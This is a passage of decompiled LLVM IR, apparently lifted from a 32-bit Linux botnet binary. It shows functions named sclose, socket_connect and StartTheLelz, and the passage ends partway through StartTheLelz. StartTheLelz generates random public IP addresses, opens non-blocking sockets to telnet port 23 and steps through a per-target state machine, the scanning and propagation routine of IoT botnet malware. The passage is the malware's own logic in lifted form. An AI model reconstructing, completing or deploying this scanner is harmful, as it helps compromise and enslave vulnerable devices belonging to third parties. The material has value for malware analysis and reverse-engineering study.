  %v2_804b54f = inttoptr i32 %v1_804b54f to i16*
  store i16 0, i16* %v2_804b54f, align 2
  %v1_804b558 = add i32 %v4_804b510, 8
  %v2_804b558 = inttoptr i32 %v1_804b558 to i8*
  store i8 -1, i8* %v2_804b558, align 1
  %v3_804b562 = add i32 %v4_804b510, 9
  %v4_804b562 = inttoptr i32 %v3_804b562 to i8*
  store i8 %tmp8, i8* %v4_804b562, align 1
  %v1_804b568 = add i32 %v4_804b510, 10
  %v2_804b568 = inttoptr i32 %v1_804b568 to i16*
  store i16 0, i16* %v2_804b568, align 2
  %v2_804b574 = add i32 %v4_804b510, 12
  %v3_804b574 = inttoptr i32 %v2_804b574 to i32*
  %v2_804b57d = add i32 %v4_804b510, 16
  %v3_804b57d = inttoptr i32 %v2_804b57d to i32*
  store i32 %tmp, i32* %v3_804b57d, align 4
  %v2_804b580 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b580, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 2, 0, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v4_804b588 = add i32 %arg1, -2
  %v9_804b588 = sub i32 1, %arg1
  %v10_804b588 = and i32 %v9_804b588, %arg1
  %v11_804b588 = icmp slt i32 %v10_804b588, 0
  %v12_804b588 = icmp eq i32 %v4_804b588, 0
  %v13_804b588 = icmp slt i32 %v4_804b588, 0
  %v3_804b58c = icmp eq i1 %v13_804b588, %v11_804b588
  %v4_804b58c = icmp eq i1 %v12_804b588, false
  %v5_804b58c = and i1 %v4_804b58c, %v3_804b58c
  br i1 %v5_804b58c, label %dec_label_pc_804b597, label %dec_label_pc_804b5ac

dec_label_pc_804b597:                             ; preds = %entry
  %v1_804b59d = call i32 @__libc_close(i32 %arg1)
  br label %dec_label_pc_804b5ac

dec_label_pc_804b5ac:                             ; preds = %entry, %dec_label_pc_804b597
  %storemerge = phi i32 [ 0, %dec_label_pc_804b597 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804b588, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804b5ac, { 1, 0 }
}

define i32 @socket_connect(i32 %arg1, i16 %arg2) local_unnamed_addr {
entry:
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  store i32 1, i32* %stack_var_-32, align 4
  %v1_804b5cb = call i32 @__GI_gethostbyname(i32 %arg1)
  %v4_804b5d6 = icmp eq i32 %v1_804b5cb, 0
  %v1_804b5da = icmp eq i1 %v4_804b5d6, false
  br i1 %v1_804b5da, label %dec_label_pc_804b5e8, label %dec_label_pc_804b5dc

dec_label_pc_804b5dc:                             ; preds = %entry
  br label %dec_label_pc_804b68d

dec_label_pc_804b5e8:                             ; preds = %entry
  %v1_804b5eb = add i32 %v1_804b5cb, 12
  %v2_804b5eb = inttoptr i32 %v1_804b5eb to i32*
  %v3_804b5eb = load i32, i32* %v2_804b5eb, align 4
  %v1_804b5f3 = add i32 %v1_804b5cb, 16
  %v2_804b5f3 = inttoptr i32 %v1_804b5f3 to i32*
  %v3_804b5f3 = load i32, i32* %v2_804b5f3, align 4
  %v1_804b5f6 = inttoptr i32 %v3_804b5f3 to i32*
  %v2_804b5f6 = load i32, i32* %v1_804b5f6, align 4
  %v15_804b5ff = ptrtoint i32* %stack_var_-24 to i32
  %v3_804b604 = call i32 @bcopy(i32 %v2_804b5f6, i32 %v15_804b5ff, i32 %v3_804b5eb)
  %v1_804b60f2 = zext i16 %arg2 to i32
  %v1_804b618 = call i32 @htons(i32 %v1_804b60f2)
  store i32 2, i32* %stack_var_-28, align 4
  %v3_804b633 = call i32 @socket(i32 2, i32 1, i32 6)
  %v2_804b63e = ptrtoint i32* %stack_var_-32 to i32
  %v5_804b64e = call i32 @__GI_setsockopt(i32 %v3_804b633, i32 6, i32 1, i32 %v2_804b63e, i32 4)
  %v13_804b656 = icmp eq i32 %v3_804b633, -1
  %v1_804b65a = icmp eq i1 %v13_804b656, false
  br i1 %v1_804b65a, label %dec_label_pc_804b665, label %dec_label_pc_804b65c

dec_label_pc_804b65c:                             ; preds = %dec_label_pc_804b5e8
  br label %dec_label_pc_804b68d

dec_label_pc_804b665:                             ; preds = %dec_label_pc_804b5e8
  %v2_804b5fc = ptrtoint i32* %stack_var_-28 to i32
  %v3_804b671 = call i32 @__libc_connect(i32 %v3_804b633, i32 %v2_804b5fc, i32 16)
  %v10_804b679 = icmp eq i32 %v3_804b671, -1
  %v1_804b67c = icmp eq i1 %v10_804b679, false
  br i1 %v1_804b67c, label %dec_label_pc_804b687, label %dec_label_pc_804b67e

dec_label_pc_804b67e:                             ; preds = %dec_label_pc_804b665
  br label %dec_label_pc_804b68d

dec_label_pc_804b687:                             ; preds = %dec_label_pc_804b665
  br label %dec_label_pc_804b68d

dec_label_pc_804b68d:                             ; preds = %dec_label_pc_804b67e, %dec_label_pc_804b65c, %dec_label_pc_804b5dc, %dec_label_pc_804b687
  %v3_804b68d = phi i32 [ 0, %dec_label_pc_804b67e ], [ 0, %dec_label_pc_804b65c ], [ 0, %dec_label_pc_804b5dc ], [ %v3_804b633, %dec_label_pc_804b687 ]
  ret i32 %v3_804b68d

; uselistorder directives
  uselistorder i32 %v3_804b633, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32* %stack_var_-32, { 1, 0 }
  uselistorder label %dec_label_pc_804b68d, { 3, 0, 1, 2 }
}

define i32 @StartTheLelz(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-332 = alloca i32, align 4
  %stack_var_-328 = alloca i32, align 4
  %stack_var_-324 = alloca i32, align 4
  %stack_var_-316 = alloca i32, align 4
  %stack_var_-596 = alloca i32, align 4
  %stack_var_-604 = alloca i32, align 4
  %stack_var_-636 = alloca i32, align 4
  %v15_804b698 = ptrtoint i32* %stack_var_-636 to i32
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804b6a9 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b6a9, i32* %eax.global-to-local, align 4
  store i32 %v2_804b6a9, i32* @ebx, align 4
  %v1_804b6b3 = call i32 @rand_cmwc(i32 0)
  %v1_804b6b8 = load i32, i32* @ebx, align 4
  %v2_804b6b8 = xor i32 %v1_804b6b8, %v1_804b6b3
  store i32 %v2_804b6b8, i32* @eax, align 4
  %v1_804b6be = call i32 @srand(i32 %v2_804b6b8)
  store i32 %v1_804b6be, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-604, align 4
  %v1_804b6d4 = call i32 @htons(i32 23)
  %v2_804b6e3 = ptrtoint i32* %stack_var_-604 to i32
  %v15_804b6e9 = ptrtoint i32* %stack_var_-596 to i32
  store i32 %v15_804b6e9, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-596, align 4
  %v1_804b701 = call i32 @malloc(i32 1025)
  store i32 %v1_804b701, i32* %edx.global-to-local, align 4
  store i32 1025, i32* %eax.global-to-local, align 4
  %v3_804b71d = inttoptr i32 %v1_804b701 to i8*
  %v4_804b71d = call i32 @__GI_memset(i8* %v3_804b71d, i32 0, i32 1025)
  %v2_804b736 = mul i32 %arg2, 28
  %v1_804b73b = add i32 %v2_804b736, 30
  %v2_804b73e = and i32 %v1_804b73b, -16
  %v2_804b744 = sub i32 %v15_804b698, %v2_804b73e
  %v1_804b752 = add i32 %v2_804b744, 15
  %v2_804b755 = and i32 %v1_804b752, -16
  %v2_804b772 = mul i32 %arg2, 5
  store i32 %v2_804b772, i32* %edx.global-to-local, align 4
  %v1_804b778 = inttoptr i32 %v2_804b755 to i8*
  store i32 %v2_804b755, i32* @edi, align 4
  %v1_804b77d = and i32 %v1_804b752, -256
  store i32 %v1_804b77d, i32* %eax.global-to-local, align 4
  %v5_804b77f = call i8* @_memset(i8* %v1_804b778, i32 %v1_804b77d, i32 %v2_804b772)
  store i32 0, i32* %eax.global-to-local, align 4
  %v5_804b80c50 = icmp sgt i32 %arg2, 0
  br i1 %v5_804b80c50, label %dec_label_pc_804b78a.lr.ph, label %dec_label_pc_804b819

dec_label_pc_804b78a.lr.ph:                       ; preds = %entry
  %v2_804b7de = or i32 %v2_804b755, 9
  br label %dec_label_pc_804b78a

dec_label_pc_804b78a:                             ; preds = %dec_label_pc_804b78a, %dec_label_pc_804b78a.lr.ph
  %storemerge251 = phi i32 [ 0, %dec_label_pc_804b78a.lr.ph ], [ %v4_804b803, %dec_label_pc_804b78a ]
  %v2_804b79e = mul i32 %storemerge251, 28
  %v2_804b7a0 = add i32 %v2_804b79e, %v2_804b755
  store i32 %v2_804b7a0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804b7a8 = inttoptr i32 %v2_804b7a0 to i32*
  store i32 0, i32* %v2_804b7a8, align 4
  %v0_804b7aa = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7aa = add i32 %v0_804b7aa, 4
  store i32 %v1_804b7aa, i32* %eax.global-to-local, align 4
  %v0_804b7ad = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7ad = inttoptr i32 %v1_804b7aa to i32*
  store i32 %v0_804b7ad, i32* %v2_804b7ad, align 4
  %v0_804b7af = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7af = add i32 %v0_804b7af, 4
  store i32 %v1_804b7af, i32* %eax.global-to-local, align 4
  %v0_804b7b2 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7b2 = inttoptr i32 %v1_804b7af to i32*
  store i32 %v0_804b7b2, i32* %v2_804b7b2, align 4
  %v0_804b7b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7b4 = add i32 %v0_804b7b4, 4
  store i32 %v1_804b7b4, i32* %eax.global-to-local, align 4
  %v0_804b7b7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7b7 = inttoptr i32 %v1_804b7b4 to i32*
  store i32 %v0_804b7b7, i32* %v2_804b7b7, align 4
  %v0_804b7b9 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7b9 = add i32 %v0_804b7b9, 4
  store i32 %v1_804b7b9, i32* %eax.global-to-local, align 4
  %v0_804b7bc = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7bc = inttoptr i32 %v1_804b7b9 to i32*
  store i32 %v0_804b7bc, i32* %v2_804b7bc, align 4
  %v0_804b7be = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7be = add i32 %v0_804b7be, 4
  store i32 %v1_804b7be, i32* %eax.global-to-local, align 4
  %v0_804b7c1 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7c1 = inttoptr i32 %v1_804b7be to i32*
  store i32 %v0_804b7c1, i32* %v2_804b7c1, align 4
  %v0_804b7c3 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b7c3 = add i32 %v0_804b7c3, 4
  %v0_804b7c6 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b7c6 = inttoptr i32 %v1_804b7c3 to i32*
  store i32 %v0_804b7c6, i32* %v2_804b7c6, align 4
  %v3_804b7de = add i32 %v2_804b7de, %v2_804b79e
  %v4_804b7de = inttoptr i32 %v3_804b7de to i8*
  store i8 1, i8* %v4_804b7de, align 1
  %v1_804b7fb = add i32 %v2_804b7a0, 24
  store i32 %v1_804b7fb, i32* %edx.global-to-local, align 4
  %v2_804b801 = inttoptr i32 %v1_804b7fb to i32*
  store i32 %v1_804b701, i32* %v2_804b801, align 4
  %v4_804b803 = add nuw nsw i32 %storemerge251, 1
  store i32 %v4_804b803, i32* %eax.global-to-local, align 4
  %exitcond52 = icmp eq i32 %v4_804b803, %arg2
  br i1 %exitcond52, label %dec_label_pc_804b819, label %dec_label_pc_804b78a

dec_label_pc_804b819:                             ; preds = %entry, %dec_label_pc_804b78a, %dec_label_pc_804b819
  %stack_var_-48.0 = phi i32 [ %v4_804b819, %dec_label_pc_804b819 ], [ 0, %dec_label_pc_804b78a ], [ 0, %entry ]
  %v4_804b819 = add i32 %stack_var_-48.0, 1
  store i32 %v4_804b819, i32* %eax.global-to-local, align 4
  %v1_804b81f = mul i32 %v4_804b819, 4
  %v2_804b81f = add i32 %v1_804b81f, ptrtoint ([10 x i8*]* @global_var_80611c0.168 to i32)
  %v3_804b81f = inttoptr i32 %v2_804b81f to i32*
  %v4_804b81f = load i32, i32* %v3_804b81f, align 4
  store i32 %v4_804b81f, i32* %eax.global-to-local, align 4
  %v1_804b826 = icmp eq i32 %v4_804b81f, 0
  %v1_804b828 = icmp eq i1 %v1_804b826, false
  br i1 %v1_804b828, label %dec_label_pc_804b819, label %dec_label_pc_804b82a.preheader

dec_label_pc_804b82a.preheader:                   ; preds = %dec_label_pc_804b819
  %v2_804bc40 = ptrtoint i32* %stack_var_-316 to i32
  %tmp38 = bitcast i32* %stack_var_-316 to i8*
  %v2_804bcc3 = ptrtoint i32* %stack_var_-324 to i32
  %v2_804bd1b = ptrtoint i32* %stack_var_-328 to i32
  %v2_804bd22 = ptrtoint i32* %stack_var_-332 to i32
  %v2_804b89b = or i32 %v2_804b755, 8
  %v2_804b8de = or i32 %v2_804b755, 9
  %v2_804b9cd = or i32 %v2_804b755, 11
  %v2_804ba07 = or i32 %v2_804b755, 10
  %v2_804c402 = add i32 %v2_804b755, 16
  br label %dec_label_pc_804b82a

dec_label_pc_804b82a:                             ; preds = %dec_label_pc_804b82a, %dec_label_pc_804c779, %dec_label_pc_804b82a.preheader
  %stack_var_-624.0 = phi i32 [ %tmp4, %dec_label_pc_804b82a.preheader ], [ %stack_var_-624.0, %dec_label_pc_804b82a ], [ %stack_var_-624.1, %dec_label_pc_804c779 ]
  %stack_var_-620.0 = phi i32 [ %tmp5, %dec_label_pc_804b82a.preheader ], [ %stack_var_-620.0, %dec_label_pc_804b82a ], [ %stack_var_-620.1, %dec_label_pc_804c779 ]
  store i32 0, i32* %eax.global-to-local, align 4
  br i1 %v5_804b80c50, label %dec_label_pc_804b836, label %dec_label_pc_804b82a

dec_label_pc_804b836:                             ; preds = %dec_label_pc_804b82a, %dec_label_pc_804c779
  %storemerge45 = phi i32 [ %v4_804c779, %dec_label_pc_804c779 ], [ 0, %dec_label_pc_804b82a ]
  %stack_var_-620.244 = phi i32 [ %stack_var_-620.1, %dec_label_pc_804c779 ], [ %stack_var_-620.0, %dec_label_pc_804b82a ]
  %stack_var_-624.243 = phi i32 [ %stack_var_-624.1, %dec_label_pc_804c779 ], [ %stack_var_-624.0, %dec_label_pc_804b82a ]
  %v1_804b83c = mul i32 %storemerge45, 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  %v2_804b84a = mul i32 %storemerge45, 28
  %v2_804b84c = add i32 %v2_804b84a, %v2_804b755
  %v1_804b84e = add i32 %v2_804b84c, 16
  store i32 %v1_804b84e, i32* %eax.global-to-local, align 4
  %v1_804b851 = inttoptr i32 %v1_804b84e to i32*
  %v2_804b851 = load i32, i32* %v1_804b851, align 4
  store i32 %v2_804b851, i32* %eax.global-to-local, align 4
  %v1_804b853 = icmp eq i32 %v2_804b851, 0
  %v1_804b855 = icmp eq i1 %v1_804b853, false
  br i1 %v1_804b855, label %dec_label_pc_804b885, label %dec_label_pc_804b857

dec_label_pc_804b857:                             ; preds = %dec_label_pc_804b836
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804b85a = load i32, i32* @esp, align 4
  %v1_804b85d = add i32 %v0_804b85a, -16
  %v2_804b85d = inttoptr i32 %v1_804b85d to i32*
  store i32 0, i32* %v2_804b85d, align 4
  %v1_804b85f = inttoptr i32 %storemerge45 to i32*
  %v2_804b85f = call i32 @__GI_time(i32* %v1_804b85f)
  store i32 %v2_804b85f, i32* @esi, align 4
  %v0_804b86c = load i32, i32* @ebx, align 4
  %v1_804b86e = mul i32 %v0_804b86c, 4
  store i32 %v1_804b86e, i32* %edx.global-to-local, align 4
  %v2_804b87c = mul i32 %v0_804b86c, 28
  %v2_804b87e = add i32 %v2_804b87c, %v2_804b755
  %v1_804b880 = add i32 %v2_804b87e, 16
  store i32 %v1_804b880, i32* %eax.global-to-local, align 4
  %v2_804b883 = inttoptr i32 %v1_804b880 to i32*
  store i32 %v2_804b85f, i32* %v2_804b883, align 4
  br label %dec_label_pc_804b885

dec_label_pc_804b885:                             ; preds = %dec_label_pc_804b836, %dec_label_pc_804b857
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804b89b = add i32 %v2_804b89b, %v2_804b84a
  %v4_804b89b = inttoptr i32 %v3_804b89b to i8*
  %v5_804b89b = load i8, i8* %v4_804b89b, align 4
  %v6_804b89b = zext i8 %v5_804b89b to i32
  %v8_804b89b = and i32 %v2_804b84a, -256
  %v9_804b89b = or i32 %v6_804b89b, %v8_804b89b
  store i32 %v9_804b89b, i32* %eax.global-to-local, align 4
  store i32 %v6_804b89b, i32* %edx.global-to-local, align 4
  store i32 %v6_804b89b, i32* @edi, align 4
  %v1_804b8bf = mul nuw nsw i32 %v6_804b89b, 4
  %v2_804b8bf = add nuw nsw i32 %v1_804b8bf, 134575916
  %v3_804b8bf = inttoptr i32 %v2_804b8bf to i32*
  %v4_804b8bf = load i32, i32* %v3_804b8bf, align 4
  store i32 %v4_804b8bf, i32* %eax.global-to-local, align 4
  switch i8 %v5_804b89b, label %dec_label_pc_804c779 [
    i8 0, label %dec_label_pc_804b8c8
    i8 1, label %dec_label_pc_804bc36
    i8 2, label %dec_label_pc_804be7b
    i8 3, label %dec_label_pc_804bfb7
    i8 4, label %dec_label_pc_804c0ff
    i8 5, label %dec_label_pc_804c23b
    i8 6, label %dec_label_pc_804c383
    i8 7, label %dec_label_pc_804c61d
  ]

dec_label_pc_804b8c8:                             ; preds = %dec_label_pc_804b885
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804b8de = add i32 %v2_804b8de, %v2_804b84a
  %v4_804b8de = inttoptr i32 %v3_804b8de to i8*
  %v5_804b8de = load i8, i8* %v4_804b8de, align 1
  %v10_804b8e2 = icmp eq i8 %v5_804b8de, 1
  %v1_804b8e4 = icmp eq i1 %v10_804b8e2, false
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  br i1 %v1_804b8e4, label %dec_label_pc_804b993, label %dec_label_pc_804b8ea

dec_label_pc_804b8ea:                             ; preds = %dec_label_pc_804b8c8
  %v1_804b902 = add i32 %v2_804b84c, 24
  store i32 %v1_804b902, i32* %eax.global-to-local, align 4
  %v1_804b905 = inttoptr i32 %v1_804b902 to i32*
  %v2_804b905 = load i32, i32* %v1_804b905, align 4
  store i32 %v2_804b84c, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v2_804b928 = inttoptr i32 %v2_804b84c to i32*
  store i32 0, i32* %v2_804b928, align 4
  %v0_804b92a = load i32, i32* %eax.global-to-local, align 4
  %v1_804b92a = add i32 %v0_804b92a, 4
  store i32 %v1_804b92a, i32* %eax.global-to-local, align 4
  %v0_804b92d = load i32, i32* %edx.global-to-local, align 4
  %v2_804b92d = inttoptr i32 %v1_804b92a to i32*
  store i32 %v0_804b92d, i32* %v2_804b92d, align 4
  %v0_804b92f = load i32, i32* %eax.global-to-local, align 4
  %v1_804b92f = add i32 %v0_804b92f, 4
  store i32 %v1_804b92f, i32* %eax.global-to-local, align 4
  %v0_804b932 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b932 = inttoptr i32 %v1_804b92f to i32*
  store i32 %v0_804b932, i32* %v2_804b932, align 4
  %v0_804b934 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b934 = add i32 %v0_804b934, 4
  store i32 %v1_804b934, i32* %eax.global-to-local, align 4
  %v0_804b937 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b937 = inttoptr i32 %v1_804b934 to i32*
  store i32 %v0_804b937, i32* %v2_804b937, align 4
  %v0_804b939 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b939 = add i32 %v0_804b939, 4
  store i32 %v1_804b939, i32* %eax.global-to-local, align 4
  %v0_804b93c = load i32, i32* %edx.global-to-local, align 4
  %v2_804b93c = inttoptr i32 %v1_804b939 to i32*
  store i32 %v0_804b93c, i32* %v2_804b93c, align 4
  %v0_804b93e = load i32, i32* %eax.global-to-local, align 4
  %v1_804b93e = add i32 %v0_804b93e, 4
  store i32 %v1_804b93e, i32* %eax.global-to-local, align 4
  %v0_804b941 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b941 = inttoptr i32 %v1_804b93e to i32*
  store i32 %v0_804b941, i32* %v2_804b941, align 4
  %v0_804b943 = load i32, i32* %eax.global-to-local, align 4
  %v1_804b943 = add i32 %v0_804b943, 4
  %v0_804b946 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b946 = inttoptr i32 %v1_804b943 to i32*
  store i32 %v0_804b946, i32* %v2_804b946, align 4
  store i32 %v1_804b902, i32* %edx.global-to-local, align 4
  store i32 %v2_804b905, i32* @eax, align 4
  store i32 %v2_804b905, i32* %v1_804b905, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804b96b = call i32 @GetRandomPublicIP(i32 %v6_804b89b)
  %v0_804b975 = load i32, i32* @ebx, align 4
  %v1_804b977 = mul i32 %v0_804b975, 4
  store i32 %v1_804b977, i32* %edx.global-to-local, align 4
  %v2_804b985 = mul i32 %v0_804b975, 28
  %v2_804b987 = add i32 %v2_804b985, %v2_804b755
  %v1_804b989 = add i32 %v2_804b987, 4
  store i32 %v1_804b989, i32* %eax.global-to-local, align 4
  %v2_804b98c = inttoptr i32 %v1_804b989 to i32*
  store i32 %v1_804b96b, i32* %v2_804b98c, align 4
  br label %dec_label_pc_804baa5

dec_label_pc_804b993:                             ; preds = %dec_label_pc_804b8c8
  %v5_804b9a9 = load i8, i8* %v4_804b8de, align 1
  %v6_804b9a9 = zext i8 %v5_804b9a9 to i32
  %v9_804b9a9 = or i32 %v6_804b9a9, %v8_804b89b
  store i32 %v9_804b9a9, i32* %eax.global-to-local, align 4
  %v4_804b9ad = icmp eq i8 %v5_804b9a9, 0
  %v1_804b9af = icmp eq i1 %v4_804b9ad, false
  br i1 %v1_804b9af, label %dec_label_pc_804baa5, label %dec_label_pc_804b9b5

dec_label_pc_804b9b5:                             ; preds = %dec_label_pc_804b993
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804b9cd = add i32 %v2_804b9cd, %v2_804b84a
  %v4_804b9cd = inttoptr i32 %v3_804b9cd to i8*
  %v5_804b9cd = load i8, i8* %v4_804b9cd, align 1
  %v1_804b9d1 = add i8 %v5_804b9cd, 1
  store i8 %v1_804b9d1, i8* %v4_804b9cd, align 1
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804ba07 = add i32 %v2_804ba07, %v2_804b84a
  %v4_804ba07 = inttoptr i32 %v3_804ba07 to i8*
  %v5_804ba07 = load i8, i8* %v4_804ba07, align 2
  %v6_804ba07 = zext i8 %v5_804ba07 to i32
  %v9_804ba07 = or i32 %v6_804ba07, %v8_804b89b
  %v1_804ba0b = add i32 %v9_804ba07, 1
  store i32 %v1_804ba0b, i32* @esi, align 4
  %v1_804ba25 = trunc i32 %v1_804ba0b to i8
  store i8 %v1_804ba25, i8* %v4_804ba07, align 2
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v5_804ba3f = load i8, i8* %v4_804b9cd, align 1
  %v10_804ba43 = icmp eq i8 %v5_804ba3f, 3
  %v1_804ba45 = icmp eq i1 %v10_804ba43, false
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  br i1 %v1_804ba45, label %dec_label_pc_804ba67, label %dec_label_pc_804ba47

dec_label_pc_804ba47:                             ; preds = %dec_label_pc_804b9b5
  store i8 1, i8* %v4_804b8de, align 1
  br label %dec_label_pc_804c779

dec_label_pc_804ba67:                             ; preds = %dec_label_pc_804b9b5
  %v5_804ba7d = load i8, i8* %v4_804ba07, align 2
  %v6_804ba7d = zext i8 %v5_804ba7d to i32
  %v9_804ba7d = or i32 %v6_804ba7d, %v8_804b89b
  store i32 %v9_804ba7d, i32* %eax.global-to-local, align 4
  %v10_804ba81 = icmp eq i8 %v5_804ba7d, 3
  %v1_804ba83 = icmp eq i1 %v10_804ba81, false
  br i1 %v1_804ba83, label %dec_label_pc_804baa5, label %dec_label_pc_804ba85

dec_label_pc_804ba85:                             ; preds = %dec_label_pc_804ba67
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  store i8 1, i8* %v4_804b8de, align 1
  br label %dec_label_pc_804c779

dec_label_pc_804baa5:                             ; preds = %dec_label_pc_804ba67, %dec_label_pc_804b993, %dec_label_pc_804b8ea
  store i32 2, i32* %stack_var_-604, align 4
  %v0_804baae = load i32, i32* @esp, align 4
  %v1_804bab1 = add i32 %v0_804baae, -16
  %v2_804bab1 = inttoptr i32 %v1_804bab1 to i32*
  store i32 23, i32* %v2_804bab1, align 4
  %v0_804bab3 = load i32, i32* %stack_var_-604, align 4
  %v1_804bab3 = call i32 @htons(i32 %v0_804bab3)
  %v0_804bab8 = load i32, i32* @esp, align 4
  store i32 0, i32* %stack_var_-596, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  %v1_804baf0 = add i32 %v2_804b84c, 4
  store i32 %v1_804baf0, i32* %eax.global-to-local, align 4
  %v1_804baf3 = inttoptr i32 %v1_804baf0 to i32*
  %v2_804baf3 = load i32, i32* %v1_804baf3, align 4
  store i32 %v2_804baf3, i32* %eax.global-to-local, align 4
  store i32 %storemerge45, i32* @ebx, align 4
  %v1_804bb01 = add i32 %v0_804bab8, 8
  %v2_804bb01 = inttoptr i32 %v1_804bb01 to i32*
  store i32 0, i32* %v2_804bb01, align 4
  %v1_804bb03 = add i32 %v0_804bab8, 4
  %v2_804bb03 = inttoptr i32 %v1_804bb03 to i32*
  store i32 1, i32* %v2_804bb03, align 4
  %v2_804bb05 = inttoptr i32 %v0_804bab8 to i32*
  store i32 2, i32* %v2_804bb05, align 4
  %v2_804bb07 = load i32, i32* %stack_var_-596, align 4
  %sext = mul i32 %v1_804bab3, 65536
  %v3_804bb07 = sdiv i32 %sext, 65536
  %v4_804bb07 = call i32 @socket(i32 %v3_804bb07, i32 %v2_804baf3, i32 %v2_804bb07)
  store i32 %v4_804bb07, i32* @esi, align 4
  %v0_804bb14 = load i32, i32* @ebx, align 4
  %v2_804bb24 = mul i32 %v0_804bb14, 28
  %v3_804bb26 = add i32 %v2_804bb24, %v2_804b755
  %v4_804bb26 = inttoptr i32 %v3_804bb26 to i32*
  store i32 %v4_804bb07, i32* %v4_804bb26, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v3_804bb3f = inttoptr i32 %v2_804b84c to i32*
  %v4_804bb3f = load i32, i32* %v3_804bb3f, align 4
  store i32 %v4_804bb3f, i32* %eax.global-to-local, align 4
  %v10_804bb42 = icmp eq i32 %v4_804bb3f, -1
  br i1 %v10_804bb42, label %dec_label_pc_804c779, label %dec_label_pc_804bb4b

dec_label_pc_804bb4b:                             ; preds = %dec_label_pc_804baa5
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bb61 = load i32, i32* %v3_804bb3f, align 4
  store i32 %v4_804bb61, i32* %eax.global-to-local, align 4
  %v0_804bb64 = load i32, i32* @esp, align 4
  %v1_804bb67 = add i32 %v0_804bb64, -8
  %v2_804bb67 = inttoptr i32 %v1_804bb67 to i32*
  store i32 0, i32* %v2_804bb67, align 4
  %v1_804bb69 = add i32 %v0_804bb64, -12
  %v2_804bb69 = inttoptr i32 %v1_804bb69 to i32*
  store i32 3, i32* %v2_804bb69, align 4
  %v0_804bb6b = load i32, i32* %eax.global-to-local, align 4
  %v2_804bb6b = add i32 %v0_804bb64, -16
  %v3_804bb6b = inttoptr i32 %v2_804bb6b to i32*
  store i32 %v0_804bb6b, i32* %v3_804bb6b, align 4
  %v1_804bb6c = load i32, i32* %stack_var_-596, align 4
  %v3_804bb6c = call i32 @__libc_fcntl(i32 %v2_804baf3, i32 %v1_804bb6c, i32 0)
  %v0_804bb71 = load i32, i32* @esp, align 4
  %v12_804bb76 = or i32 %v3_804bb6c, 2048
  store i32 %v12_804bb76, i32* @ebx, align 4
  store i32 %v1_804b83c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b84a, i32* %eax.global-to-local, align 4
  %v4_804bb8f = load i32, i32* %v3_804bb3f, align 4
  store i32 %v4_804bb8f, i32* %eax.global-to-local, align 4
  %v2_804bb95 = add i32 %v0_804bb71, 8
  %v3_804bb95 = inttoptr i32 %v2_804bb95 to i32*
  store i32 %v12_804bb76, i32* %v3_804bb95, align 4
  %v1_804bb96 = add i32 %v0_804bb71, 4
  %v2_804bb96 = inttoptr i32 %v1_804bb96 to i32*
  store i32 4, i32* %v2_804bb96, align 4
